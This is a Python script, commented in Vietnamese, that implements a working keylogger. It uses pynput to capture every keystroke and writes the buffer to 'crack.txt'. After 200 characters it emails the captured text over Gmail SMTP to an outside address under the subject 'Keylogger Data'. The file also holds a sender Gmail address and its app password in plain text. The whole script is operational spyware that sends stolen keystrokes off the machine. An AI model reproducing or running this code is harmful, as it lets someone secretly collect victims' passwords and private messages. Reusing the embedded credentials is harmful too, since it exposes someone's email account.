from pynput.keyboard import Listener, Key  # Không cần KeyCode nữa
import smtplib
import threading
from email.mime.text import MIMEText

# Cấu hình email
EMAIL_SENDER = "dodanghoan.learn@gmail.com"
EMAIL_PASSWORD = "ycge rbqy ngqw ayhp"  # App Password của Gmail
EMAIL_RECEIVER = "ghuhe98@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# Biến toàn cục
char_count = 0
file_path = 'crack.txt'
LimitKeyLogger = 200
lock = threading.Lock()
buffer = []  # Buffer để lưu ký tự

def send_email():
    global char_count, buffer
    with lock:
        if char_count < LimitKeyLogger:
            return
        try:
            content = ''.join(buffer).strip()
            if not content:
                return
            msg = MIMEText(content)
            msg["Subject"] = "Keylogger Data"
            msg["From"] = EMAIL_SENDER
            msg["To"] = EMAIL_RECEIVER

            def send():
                try:
                    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                        server.starttls()
                        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
                        server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
                except Exception as e:
                    print("[-] Error sending email:", e)

            email_thread = threading.Thread(target=send, daemon=True)
            email_thread.start()

            # Reset file và buffer
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write("")
                f.flush()
            buffer.clear()
            char_count = 0
        except Exception as e:
            print("[-] Error processing email:", e)

def process_key(key):
    """Xử lý phím và trả về ký tự phù hợp"""
    try:
        return key.char  # Chỉ ghi ký tự thường
    except AttributeError:
        if key == Key.space:
            return " "
        elif key == Key.enter:
            return "\n"
        elif key == Key.backspace:
            return None  # Xử lý trong on_press
        elif key == Key.tab:
            return "\t"
        elif key == Key.f10:  # Thoát chương trình
            raise SystemExit(0)
        return None  # Bỏ qua các phím đặc biệt như Ctrl, Shift, ...

def on_press(key):
    global char_count, buffer
    try:
        key_str = process_key(key)
        with lock:
            if key == Key.backspace and buffer:
                buffer.pop()
                char_count = max(0, char_count - 1)
            elif key_str:
                buffer.append(key_str)
                char_count += len(key_str)
            
            # Ghi buffer vào file
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(''.join(buffer))
                f.flush()
            
            # Kiểm tra giới hạn để gửi email
            if char_count >= LimitKeyLogger:
                threading.Thread(target=send_email, daemon=True).start()
    except Exception as e:
        print(f"[-] Error processing key: {e}")

def on_release(key):
    """Không cần xử lý gì khi thả phím"""
    pass

# Khởi động listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()